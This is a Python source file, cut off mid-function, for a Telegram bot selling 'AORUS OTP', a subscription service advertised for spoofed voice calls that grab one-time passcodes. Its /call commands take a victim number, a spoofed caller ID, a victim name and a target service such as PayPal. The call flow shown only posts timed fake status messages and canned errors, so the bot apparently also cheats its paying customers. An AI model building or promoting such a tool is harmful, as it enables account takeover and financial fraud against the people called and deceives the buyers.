import asyncio
from aiogram import Bot, Dispatcher,F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from aiogram import Bot
from UsersDB import *
from datetime import datetime, timedelta
from KeysDB import *
from Others import *
from Functions import *
from keepalive import keep_alive
from asyncio import sleep
from random import randint
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
import ast

keep_alive()
load_dotenv()

bot = Bot(os.environ.get('BOT_TOKEN'))
dp = Dispatcher()

reset_all_user_actions()

#BAN USER
@dp.message(Command("keys")) # DONE
async def keys(message: Message):
    user_id = message.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if user_id == admin_ID:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔁 Reset Keys", callback_data="reset"),
                                                                InlineKeyboardButton(text="🔑 Get Keys", callback_data="get")],
                                                                [InlineKeyboardButton(text="🔙 Leave it As is", callback_data="back1")]])
            await message.answer("🔑 Choose the keys action.",reply_markup=keyboard)
        else:
            await message.answer("🚫 Only admin can use this command.")

@dp.message(Command("cancel"))
async def cancel_fsm(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if get_user_info(user_id,'Banned')==False:
        if check_subscription(get_user_info(user_id,'Expiry_Date'))==True:
            if get_user_info(user_id,'In_Action')=='NN':
                await message.answer("❌ There is no proccess.")
            elif get_user_info(user_id,'In_Action')=='CS':
                set_user_value(user_id,'In_Action','NN')
                await state.clear()
                await message.answer("❌ Creating custom script process cancelled!")
            else:
                set_user_value(user_id,'In_Action','NN')
                await state.clear()
                await message.answer("❌ Creating first call process cancelled!")


@dp.callback_query(F.data.in_(["reset","get"]))#DONE
async def reset_get_keys(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if user_id == admin_ID:
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="1 Day", callback_data="1DAYZ+"+callback.data),
                            InlineKeyboardButton(text="3 Days", callback_data="3DAYZ+"+callback.data)],
                            [InlineKeyboardButton(text="1 Week", callback_data="1WEEK+"+callback.data),
                            InlineKeyboardButton(text="1 Month", callback_data="1MNTH+"+callback.data)],
                            [InlineKeyboardButton(text="2 Hours", callback_data="2HOUR+"+callback.data)],
                            [InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")]])
            await callback.message.delete()
            await callback.message.answer("🔑 Choose the keys type.",reply_markup=keyboard) 


@dp.callback_query(F.data.in_(["1DAYZ+get", "1DAYZ+reset","3DAYZ+get", "3DAYZ+reset","1WEEK+get", "1WEEK+reset","1MNTH+get", "1MNTH+reset","2HOUR+get", "2HOUR+reset"]))#DONE
async def choose_keys_type(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if user_id == admin_ID:
            await callback.message.delete()
            comm = callback.data
            key_type = comm[:comm.find('+')]
            action = comm.split('+')[1]
            if action == "get":
                keys = show_valid_keys(key_type)
                await callback.message.answer(
                        "✅ *Available "+duration(key_type)+" Keys*\: \n" + "\n".join(keys),parse_mode='MarkdownV2')
            else:
               reset_key(key_type)
               await callback.message.answer("✅ "+duration(key_type)+" reset successfully!") 


#BAN USER
@dp.message(Command("ban")) # DONE
async def ban(message: Message):
    user_id = message.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if user_id == admin_ID:
            args = message.text.split(maxsplit=1)
            set_user_value(int(args[1]),'Banned',True)
            await bot.send_message(chat_id=banned_ID,text=get_user_info(int(args[1]),'First_Name')+' banned successfully!')
            for msg_id in range(message.message_id - 50, message.message_id):
                try:
                    await bot.delete_message(chat_id=int(args[1]), message_id=msg_id)
                except:
                    pass
            try:
                await bot.ban_chat_member(chat_id=main_channel_ID, user_id=int(args[1]))
                await bot.ban_chat_member(chat_id=vouches_ID, user_id=int(args[1]))
                await bot.send_message(chat_id=banned_ID,text="User "+get_user_info(int(args[1]),'First_Name')+" has been banned from the channels.")
            except Exception as e:
                await bot.send_message(chat_id=banned_ID,text="Failed to ban user: "+str(e))
        else:
            await message.answer("🚫 Only admin can use this command.")

#UNBAN USER
@dp.message(Command("unban")) # DONE
async def unban(message: Message):
    user_id = message.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if user_id == admin_ID:
            args = message.text.split(maxsplit=1)
            set_user_value(int(args[1]),'Banned',False)
            await bot.send_message(chat_id=banned_ID,text=get_user_info(int(args[1]),'First_Name')+' unbanned successfully!')
            try:
                await bot.unban_chat_member(chat_id=main_channel_ID, user_id=int(args[1]))
                await bot.unban_chat_member(chat_id=vouches_ID, user_id=int(args[1]))
                await bot.send_message(chat_id=banned_ID,text="User "+get_user_info(int(args[1]),'First_Name')+" has been unbanned from the channels.")
            except Exception as e:
                await bot.send_message(chat_id=banned_ID,text="Failed to unban user: "+str(e))
        else:
            await message.answer("🚫 Only admin can use this command.")


@dp.message(Command("update")) # DONE
async def ban(message: Message):
    user_id = message.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if user_id == admin_ID:
            global spoofing_numbers
            global spoof_message
            spoofing_numbers = get_random_lines()
            spoof_message = set_message(spoofing_numbers)
            await message.answer("✅ Spoofing numbers list Updated Successfully!")
        else:
            await message.answer("🚫 Only admin can use this command.")


#COMMANDS FOR ALL USERS
#START
@dp.message(Command("start"))  #DONE
async def start(message):
    user_id = message.from_user.id
    if not(get_user_info(user_id,"Banned")):
            name = message.from_user.first_name
            if not(user_exists(user_id)):
                add_user(message.from_user)
                await bot.send_message(chat_id=7674917466,text='🆕 *New user*: ['+str(get_user_count())+']\n*Username*\: '+escape_markdown(get_user_info(user_id,'Username_Name'))+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'First_Name'))+'`\n*User ID*\: `'+str(user_id)+'`',parse_mode='MarkdownV2')
            if get_user_info(user_id,'In_Action')=='NN':
                keyboard=InlineKeyboardMarkup(
                    inline_keyboard=[
                            [
                            InlineKeyboardButton(text="🦅 Get Started", callback_data="Enter")
                        ],
                        [
                            InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase")
                        ],
                        [
                            InlineKeyboardButton(text="⚙️ Tools & Commands", callback_data="Commands"),
                            InlineKeyboardButton(text="📚 How It Works", callback_data="Features")
                        ],
                        [
                            InlineKeyboardButton(text="🛠 Support Team", url=admin_link),
                            InlineKeyboardButton(text="🌍 Join Community", callback_data="community")
                        ],
                        [
                            InlineKeyboardButton(text="👤 Account Details", callback_data="profile")
                        ]
                    ]
                )

                await message.answer_photo(logo, caption="""🦅 *AORUS OTP — The Ultimate Spoofing Experience*

Since 2022\, AORUS OTP has been at the forefront of Telegram\-based OTP spoofing — delivering elite\-grade AI voice calls\, ultra\-fast global routes\, and unmatched spoofing precision\.

Trusted by thousands\, AORUS OTP combines *military\-grade stealth*\, *automated real\-time controls*\, and *cutting\-edge voice AI*\, making it the *most stable and advanced OTP grabbing system* in the scene\.

Whether you're verifying accounts\, automating workflows — AORUS equips you with the tools to *outpace*\, *outsmart*\, *and outperform*\.

🧠 *Built to Spoof\. Powered by Stability*\.
🤖 AI\-Powered Voice Delivery
🟢 Global Coverage – 24/7 Uptime
🛡 Military\-Grade Spoofing Stealth
🖥 Fully Automated\, Real\-Time Controls
⚡️ Blazing\-Fast Execution – No Delays

💬 Welcome\, *"""+escape_markdown(name)+"""* — you’re now backed by the best\.""", reply_markup=keyboard,parse_mode='MarkdownV2')
            elif get_user_info(user_id,'In_Action')=='FC':
                await message.answer("❌ You can't use commands while configur you first call.")
            else:
                await message.answer("❌ You can't use commands while making a custom script.")


#CHECK FOR PHONELIST
@dp.message(Command("phonelist")) #DONE
async def phonelist(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')!='CS':
            keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [
                        InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase")
                        ,
                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                        ]
                    ]
                    )
            if check_subscription(get_user_info(user_id,'Expiry_Date'))==True:
                keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [
                        InlineKeyboardButton(text="🛠 Support Team", url=admin_link)
                        ,
                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
                        ]
                    ]
                    )
                await message.answer(spoof_message,parse_mode='MarkdownV2',reply_markup=keyboard)
            else:
                await message.answer("⚠️ Access Denied: This command is available to subscribed users only.\nUpgrade your plan to continue.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


async def run_call_process(user_id,args, message):
    if len(args)<6:
        await message.answer("""❌ *Invalid Command Format*  
To initiate a spoofing call\, please provide all 5 required arguments\:

`"""+args[0]+""" \[victim\_number\] \[spoof\_number\] \[victim\_name\] \[service\_name\] \[digit\_length\]`

🔹 *Example\:*  
`"""+args[0]+""" +1234567890 +0987654321 John PayPal 6`""",parse_mode='MarkdownV2')
    else:
        if args[0]=='/call':
            script = 'Disabled'
        else:
            script = 'Enabled'
        victim_number,spoof_number,victim_name,service_name,otp_digit=args[1],args[2],args[3],args[4],(args[5])
        if (is_valid_phone_number(victim_number) and victim_number not in spoofing_numbers) and (is_valid_phone_number(spoof_number) and check_spoof(spoof_number,service_name,victim_name, spoofing_numbers)==True) and (is_name_valid(victim_name) == True) and check_otp_len(otp_digit)==True:
            ringing = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="End Call", callback_data="endcall")]])
            set_user_value(user_id,'In_Call',True)
            set_user_value(user_id,'Last_Call',str(args))
            await message.answer("""🟢 *CALL DETAILS *
    📞 *VICTIM NUMBER*\: `"""+escape_markdown(victim_number)+"""`
    ☎ *CALLER ID*\: `"""+escape_markdown(spoof_number)+"""`
    🏦 *SERVICE NAME*\: `"""+escape_markdown(get_service_name(service_name))+"""`
    🚹 *victim NAME* \: `"""+victim_name+"""`
    💬 *CUSTOM SCRIPT* \: `"""+script+"""`
    🎙 *VOICE* \: `"""+get_user_info(user_id,'Voice')+"""`
    🗣 *ACCENT* \: `"""+get_user_info(user_id,'Accent')+"""`
    🔢 *OTP DIGITS*\: `"""+otp_digit+'`',parse_mode='MarkdownV2')
            sleep(1)
            await message.answer("✅ *CALL STARTED*\.\.\.",parse_mode='MarkdownV2')
            await sleep(randint(2,4))
            await message.answer("📞 *CALL RINGING*",reply_markup=ringing,parse_mode='MarkdownV2')
            await sleep(randint(4,6))
            await message.answer("❌ *CALL CANCLED*",parse_mode='MarkdownV2')
            await sleep(0.2)
            if get_user_info(user_id,'In_Call')==True:
                ran_num = get_user_info(user_id,'Err_Num')
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url=errors_links[ran_num])]])
                await message.answer(text=errors[ran_num],reply_markup=error)
            set_user_value(user_id,'In_Call',False)
        elif not(is_valid_phone_number(victim_number)):
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/5')]])
            await message.answer("❌ Invalid victim phone number format. Please enter a valid number including country code.",reply_markup=error)
        elif victim_number in spoofing_numbers:
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/10')]])
            await message.answer("❌ This number is in the spoofing list. Please choose a different one.",reply_markup=error)    
        elif not(is_valid_phone_number(spoof_number)):
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/5')]])
            await message.answer("❌ Invalid spoof phone number format. Please enter a valid number including country code.",reply_markup=error)
        elif check_spoof(spoof_number,service_name,victim_name, spoofing_numbers) != True:
            if check_spoof(spoof_number,service_name,victim_name, spoofing_numbers) == 'Not Found':
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/6')]])
                await message.answer("❌ Phone number not found. Please check the spoof list and try again.",reply_markup=error)
            elif check_spoof(spoof_number,service_name,victim_name, spoofing_numbers) == 'Found':
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/11')]])
                await message.answer("❌ Not a VIP Spoof Number. This number for "+get_service_name_bynum(spoof_number)+" spoof.",reply_markup=error)
            elif check_spoof(spoof_number,service_name,victim_name, spoofing_numbers) == 'Name Found':
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/12')]])
                await message.answer("❌ Name Conflicts with a Service Name. Names can't be a service name.",reply_markup=error)
            elif check_spoof(spoof_number,service_name,victim_name, spoofing_numbers) == False:
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/7')]])
                await message.answer("❌ Spoof number and service do not match. Please verify your inputs.",reply_markup=error)
        elif is_name_valid(victim_name) == False:
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/8')]])
                await message.answer("❌ Invalid name format. Names should only contain lower and upper case letters.",reply_markup=error)
        elif check_otp_len(otp_digit)==False:
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/9')]])
            await message.answer("❌ Invalid OTP length. Please enter between 4 and 8 digits.",reply_markup=error)
        elif check_otp_len(otp_digit)=='Null':
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/13')]])
            await message.answer("❌ Invalid OTP type. Please enter digits not text.",reply_markup=error)

async def run_precall_process(user_id,args, message):
    if len(args)<4:
        await message.answer("""❌ *Invalid Command Format*  
To initiate a spoofing call\, please provide all 3 required arguments\:

`"""+args[0]+""" \[victim\_number\] \[victim\_name\] \[digit\_length\]`

🔹 *Example\:*  
`"""+args[0]+""" +1234567890 John 6`
""",parse_mode='MarkdownV2')
    else:
        victim_number,victim_name,otp_digit=args[1],args[2],args[3]
        if (is_valid_phone_number(victim_number) and victim_number not in spoofing_numbers) and (is_name_valid(victim_name) == True) and check_otp_len(otp_digit)==True:
            ringing = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="End Call", callback_data="endcall")]])
            set_user_value(user_id,'Last_Call',str(args))
            set_user_value(user_id,'In_Call',True)
            await message.answer("""🟢 *CALL DETAILS* 
    📞 *VICTIM NUMBER*\: `"""+escape_markdown(victim_number)+"""`
    ☎ *CALLER ID*\: `"""+escape_markdown(get_spoof_number(args[0][1:]))+"""`
    🏦 *SERVICE NAME*\: `"""+escape_markdown(get_service_name(args[0][1:]))+"""`
    🚹 *victim NAME* \: `"""+victim_name+"""`
    🎙 *VOICE* \: `"""+get_user_info(user_id,'Voice')+"""`
    🗣 *ACCENT* \: `"""+get_user_info(user_id,'Accent')+"""`
    🔢 *OTP DIGITS*\: `"""+otp_digit+'`',parse_mode='MarkdownV2')
            sleep(1)
            await message.answer("✅ *CALL STARTED*\.\.\.",parse_mode='MarkdownV2')
            await sleep(randint(2,4))
            await message.answer("📞 *CALL RINGING*",reply_markup=ringing,parse_mode='MarkdownV2')
            await sleep(randint(4,6))
            await message.answer("❌ *CALL CANCLED*",parse_mode='MarkdownV2')
            await sleep(0.2)
            if get_user_info(user_id,'In_Call')==True:
                ran_num = get_user_info(user_id,'Err_Num')
                error1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url=errors_links[ran_num])]])
                await message.answer(text=errors[ran_num],reply_markup=error1)
            set_user_value(user_id,'In_Call',False)
        elif not(is_valid_phone_number(victim_number)):
            error2 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/5')]])
            await message.answer("❌ Invalid victim phone number format. Please enter a valid number including country code.",reply_markup=error2)
        elif victim_number in spoofing_numbers:
            error3 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/10')]])
            await message.answer("❌ This number is in the spoofing list. Please choose a different one.",reply_markup=error3)
        elif is_name_valid(victim_name) != True:
            if is_name_valid(victim_name) == False:
                error4 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/8')]])
                await message.answer("❌ Invalid name format. Names should only contain lower and upper case letters .",reply_markup=error4)
            else:
                error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/12')]])
                await message.answer("❌ ERROR: Name Conflicts with a Service Name. Names can't be a service name.",reply_markup=error)
        elif not (4<=otp_digit<=8):
            error5 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/9')]])
            await message.answer("❌ Invalid OTP length. Please enter between 4 and 8 digits.",reply_markup=error5)
        elif check_otp_len(otp_digit)=='Null':
            error = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🛠 Support Team", url=admin_link),InlineKeyboardButton(text="ℹ️ More Info", url='https://t.me/repports_errors/13')]])
            await message.answer("❌ Invalid OTP type. Please enter digits not text.",reply_markup=error)

#PROFILE
@dp.message(Command("plan")) #DONE
async def plan(message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            expiry_date = get_user_info(user_id,'Expiry_Date')
            if check_subscription(expiry_date) != True :
                plan = 'Free'
                status = '🔴 Not Active'
                date = 'N/A'
            else:
                plan = 'Pro'
                status = '🟢 Active'
                date = get_user_info(user_id,'Expiry_Date')[0:16]
            keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🛠 Support Team", url=admin_link)
                ,
                
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")
                ]
            ]
            )
            await message.answer("""👤 *Your Profile Details*

🆔 *User ID*\: `"""+str(user_id)+"""`
📛 *Username*\: `"""+escape_markdown(get_user_info(user_id,'Username_Name'))+"""`
⭐️ *Status*\: `"""+status+"""`
📦 *Plan*\: `"""+plan+"""`
⏳ *Plan End in*: `"""+escape_markdown(date)+"""`""",parse_mode='MarkdownV2',reply_markup=keyboard)
        elif get_user_info(user_id,'In_Action')=='FC':
            await message.answer("❌ You can't use commands while configur you first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


#REDEEM KEY
@dp.message(Command("redeem"))
async def redeem(message: Message): #DONE
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            args = message.text.split(maxsplit=1)
            if len(args) < 2:
                await message.answer("""❌ *Activation Key Missing*  
To proceed\, please enter your key using:  
`/redeem [activation key]`
""",parse_mode="MarkdownV2")
            else:
                key = args[1]
                msg = redeem_keys(user_id, key)
                await message.answer(text=msg,parse_mode='MarkdownV2')
                if msg[0] == '✅':
                    parts = key.split("-")
                    duration_code = parts[1]
                    duration_text = duration(duration_code)
                    await bot.send_message(chat_id=redeem_keys,text='*Key For '+duration_text+'*\n*Redeemed by*\: '+escape_markdown(get_user_info(user_id,'User_Name'))+'\n*Name*\: `'+escape_markdown(get_user_info(user_id,'First_Name'))+'`\n*Chat Id\: *`'+str(user_id)+'`',parse_mode='MarkdownV2')
        elif get_user_info(user_id,'In_Action')=='FC':
            await message.answer("❌ You can't use commands while configur you first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


@dp.message(Command("setvoice"))
async def set_voice(message: Message): #DONE
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎙 Change Voice", callback_data="setvoice"),
                                                                InlineKeyboardButton(text="🗣 Change Accent", callback_data="setaccent")],
                                                                [InlineKeyboardButton(text="🔙 Leave it As is", callback_data="back1")]])
                current_voice = get_user_info(user_id,'Voice')
                current_accent = get_user_info(user_id,'Accent')
                if current_voice in ['Jorch','William']:
                    gender = 'Male'
                else:
                    gender = 'Female'
                
                await message.answer("""🎙 *Current Voice Configuration*
🚹 *Voice Name*\: `"""+current_voice+"""`
⚥ *Gender*\: `"""+gender+"""`
🗣 *Accent*\: `"""+current_accent+"""`

To select a different voice\, please choose one from the list below\.
For a full list of available voices\, use the command\: /VoiceList

🛠 Customize your voice to match your needs and enhance the experience\.""",parse_mode='MarkdownV2',reply_markup=keyboard)
            elif check_subscription(get_user_info(user_id,'Expiry_Date')) == False:
                await message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            else:
                await message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
            await message.answer("❌ You can't use commands while configur you first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


@dp.callback_query(F.data.in_(["setvoice","setaccent"]))#DONE
async def chose_voice_accent(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                if callback.data == 'setvoice':
                    await callback.message.delete()
                    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🚹 Jorch", callback_data="Jorch"),
                                                                    InlineKeyboardButton(text="🚹 William", callback_data="William")],
                                                                    [InlineKeyboardButton(text="🚺 Emma", callback_data="Emma"),
                                                                    InlineKeyboardButton(text="🚺 Lara", callback_data="Lara")],
                                                                    [InlineKeyboardButton(text="🔙 Leave it As is", callback_data="back1")]])
                    await callback.message.answer("🗣 Please select one of the voices bellow.",reply_markup=keyboard)
                else:
                    await callback.message.delete()
                    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🇺🇸 North America", callback_data="North America"),
                                                                    InlineKeyboardButton(text="🇬🇧 Europe", callback_data="Europe")],
                                                                    [InlineKeyboardButton(text="🇲🇽 Latin America", callback_data="Latin America"),
                                                                    InlineKeyboardButton(text="🌏 Asia & Pacific", callback_data="Asia & Pacific")],
                                                                    [InlineKeyboardButton(text="🌍 Middle East & Africa", callback_data="Middle East & Africa")],
                                                                    [InlineKeyboardButton(text="🔙 Leave it As is", callback_data="back1")]])
                    await callback.message.answer("🗣 Please select one of the accents bellow.",reply_markup=keyboard)
            elif check_subscription(get_user_info(user_id,'Expiry_Date')) == False:
                await callback.message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            else:
                await callback.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


@dp.callback_query(F.data.in_(["Jorch","William","Emma","Lara"]))#DONE
async def choose_voice(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                await callback.message.delete()
                voice = callback.data
                set_user_value(user_id,"Voice",voice)
                keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")]])
                await callback.message.answer("✅ Voice changed to "+voice+" successfully!",reply_markup=keyboard)
            elif check_subscription(get_user_info(user_id,'Expiry_Date')) == False:
                await callback.message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            else:
                await callback.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")


@dp.callback_query(F.data.in_(["North America","Europe","Latin America","Asia & Pacific","Middle East & Africa"]))#DONE
async def choose_accent(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not(get_user_info(user_id,"Banned")):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                await callback.message.delete()
                Accent = callback.data
                set_user_value(user_id,"Accent",Accent)
                keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back1")]])
                await callback.message.answer("✅ Accent changed to "+Accent+" successfully!",reply_markup=keyboard)
            elif check_subscription(get_user_info(user_id,'Expiry_Date')) == False:
                await callback.message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            else:
                await callback.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
            await callback.message.answer("❌ You can't use buttons while configur you first call.")
        else:
             await callback.message.answer("❌ You can't use buttons while making a custom script.")

#call       
@dp.message(Command("call","customcall")) #DONE
async def caal_cuscaal(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) and check_subscription(get_user_info(user_id,'Expiry_Date'))!= 'Null':
                args = message.text.split(maxsplit=5)
                await run_call_process(user_id, args, message)
            elif check_subscription(get_user_info(user_id,'Expiry_Date'))==False:
                await message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'Expiry_Date') =='N/A':
                await message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
             await message.answer("❌ You can't use commands while configur your first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


#call
@dp.message(Command("recall")) #DONE
async def recall(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                s = get_user_info(user_id,'Last_Call')
                if s == 'N/A':
                    await message.answer("⚠️ No saved call found. Please use /call first.")
                else:    
                    args = ast.literal_eval(s)
                    if len(args) == 6:
                        await run_call_process(user_id, args, message)
                    else:
                        await run_precall_process(user_id, args, message)
            elif check_subscription(get_user_info(user_id,'Expiry_Date'))==False:
                await message.answer("❌ Your subscription has expired.\nTo continue using the service, please activate a new key.",reply_markup=keyboard1)
            elif get_user_info(user_id,'Expiry_Date') =='N/A':
                await message.answer("🚫 No active subscription found.\nPlease activate a key to get started.",reply_markup=keyboard1)
        elif get_user_info(user_id,'In_Action')=='FC':
             await message.answer("❌ You can't use commands while configur your first call.")
        else:
             await message.answer("❌ You can't use commands while making a custom script.")


@dp.message(Command("voicelist")) #DONE
async def voicelist(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'Banned')):
        if get_user_info(user_id,'In_Action')=='NN':
            keyboard1 = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 Plans & Pricing", callback_data="Purchase"),InlineKeyboardButton(text="🛠 Support Team", url=admin_link)]])
            if check_subscription(get_user_info(user_id,'Expiry_Date')) == True:
                back_button = InlineKeyboardMarkup(
